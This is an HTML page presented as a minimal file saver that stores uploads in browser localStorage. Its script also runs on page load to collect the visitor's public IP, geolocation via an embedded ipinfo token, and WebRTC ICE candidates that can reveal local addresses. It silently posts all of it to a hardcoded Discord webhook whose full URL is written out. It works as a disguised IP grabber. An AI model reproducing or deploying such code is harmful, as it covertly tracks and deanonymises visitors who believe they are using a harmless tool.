<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>File Saver Minimal</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(to bottom, #1a0033, #000011, #000033);
    color: white;
    text-align: center;
    padding: 50px;
  }
  h1 { color: #bb86fc; }
  .container {
    background: rgba(0, 0, 0, 0.6);
    border: 2px solid #663399;
    padding: 20px;
    border-radius: 10px;
    display: inline-block;
  }
  input[type="file"], input[type="text"], button {
    margin: 10px;
    padding: 10px;
    border-radius: 5px;
    border: none;
  }
  input[type="text"] { width: 200px; }
  button {
    background-color: #4b0082;
    color: white;
    cursor: pointer;
    transition: background 0.3s;
  }
  button:hover { background-color: #6a0dad; }
  a.download-link {
    display: block;
    margin-top: 20px;
    color: #bb86fc;
    text-decoration: none;
  }
  a.download-link:hover { text-decoration: underline; }
  #ipInfoBox {
    margin-top: 25px;
    background: rgba(255,255,255,0.1);
    padding: 15px;
    border-radius: 8px;
    white-space: pre-wrap;
    text-align: left;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
  }
</style>
</head>
<body>
  <h1>üìÅ File Saver Minimal</h1>
  <div class="container">
    <input type="file" id="fileInput"><br />
    <input type="text" id="fileName" placeholder="Enter file name"><br />
    <button id="saveBtn">Save File</button>
    <a id="downloadLink" class="download-link" style="display:none;">‚¨á Download Saved File</a><br />
    <button id="loadFileBtn">Load Saved File</button>

    <div id="ipInfoBox">Loading IP & geolocation info...</div>
  </div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI";
  const ipinfoToken = "85da0ebad68e42"; // Your lite token

  let fileData = null;

  // File input change: read file data as base64
  document.getElementById("fileInput").addEventListener("change", e => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = evt => fileData = evt.target.result;
    reader.readAsDataURL(file);
  });

  // Save file data + name to localStorage
  document.getElementById("saveBtn").addEventListener("click", () => {
    const name = document.getElementById("fileName").value.trim();
    if (!fileData || !name) {
      alert("Please select a file and enter a name.");
      return;
    }
    localStorage.setItem(name, fileData);
    updateDownloadLink(name, fileData);
  });

  // Load saved file from localStorage by name
  document.getElementById("loadFileBtn").addEventListener("click", () => {
    const name = prompt("Enter the file name to load:");
    if (!name) return;
    const saved = localStorage.getItem(name);
    if (saved) {
      updateDownloadLink(name, saved);
    } else {
      alert("File not found!");
    }
  });

  // Show download link for saved file
  function updateDownloadLink(name, data) {
    const link = document.getElementById("downloadLink");
    link.href = data;
    link.download = name;
    link.style.display = "block";
    link.textContent = `‚¨á Download "${name}"`;
  }

  // Collect all ICE candidate lines (IP or mDNS hostnames)
  function getAllCandidateLines(callback) {
    const candidates = new Set();
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer()
      .then(offer => pc.setLocalDescription(offer))
      .catch(() => callback([]));

    pc.onicecandidate = event => {
      if (!event || !event.candidate) {
        callback(Array.from(candidates));
        return;
      }
      candidates.add(event.candidate.candidate);
    };
  }

  // On load: get public IP, geolocate with lite API, get ICE candidates, send all to webhook + display on page
  function sendIPToWebhook() {
    const ipInfoBox = document.getElementById("ipInfoBox");

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const publicIP = data.ip;

        fetch(`https://api.ipinfo.io/lite/${publicIP}?token=${ipinfoToken}`)
          .then(res => res.text())
          .then(liteText => {
            getAllCandidateLines(candidates => {
              const content = `Public IP: ${publicIP}
Geo (lite):
${liteText.trim()}

ICE Candidates:
${candidates.join("\n") || "None"}`;

              // Show on page
              ipInfoBox.textContent = content;

              // Send to webhook
              fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content }),
              }).catch(() => {});
            });
          })
          .catch(() => {
            // fallback if lite fetch fails
            getAllCandidateLines(candidates => {
              const content = `Public IP: ${publicIP}\nICE Candidates:\n${candidates.join("\n") || "None"}`;
              ipInfoBox.textContent = content;

              fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content }),
              }).catch(() => {});
            });
          });
      })
      .catch(() => {
        ipInfoBox.textContent = "Failed to load IP info.";
      });
  }

  window.addEventListener("load", () => {
    sendIPToWebhook();
  });
</script>
</body>
</html>
